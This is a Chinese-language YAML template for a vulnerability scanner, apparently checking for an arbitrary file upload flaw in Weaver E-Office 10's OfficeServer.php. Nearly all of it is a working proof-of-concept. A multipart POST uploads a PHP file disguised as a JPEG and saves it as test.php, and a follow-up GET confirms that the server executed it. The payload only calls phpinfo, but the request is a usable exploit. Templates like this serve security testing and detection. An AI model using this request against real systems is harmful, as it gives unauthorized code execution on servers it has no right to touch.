app: Weaver
query: app:"Weaver"
meta:
  name: 泛微 E-Office 10 OfficeServer 任意文件上传漏洞
  level: 4
  tags:
  - file_upload
  description: '  泛微OA E-0ffice 10 OfficeServer.php 存在任意文件上传漏洞，攻击者通过漏洞可以获取到服务器敏感信息。'
  homepage: ""
  author: X prism
  references: ""
  solution: ' 前往官网下载补丁进行安装'
  create_at: "2024-07-13 11:54:47"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /eoffice10/server/public/iWebOffice2015/OfficeServer.php
          redirect: true
          header:
          - Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqhUtBPRUeNb5pjit
          params: |-
            ------WebKitFormBoundaryqhUtBPRUeNb5pjit
            Content-Disposition: form-data; name="FileData"; filename="1.jpg"
            Content-Type: image/jpeg

            <?php phpinfo();?>
            ------WebKitFormBoundaryqhUtBPRUeNb5pjit
            Content-Disposition: form-data; name="FormData"

            {'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test.php'}
            ------WebKitFormBoundaryqhUtBPRUeNb5pjit--
        response:
        - name: code
          value: "200"
          type: equals
      - request:
          method: GET
          path: /eoffice10/server/public/iWebOffice2015/Document/test.php
          redirect: true
          header: []
          params: ""
        response:
        - name: code
          value: "200"
          type: equals
        - name: body
          value: PHP Version
          type: contains
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
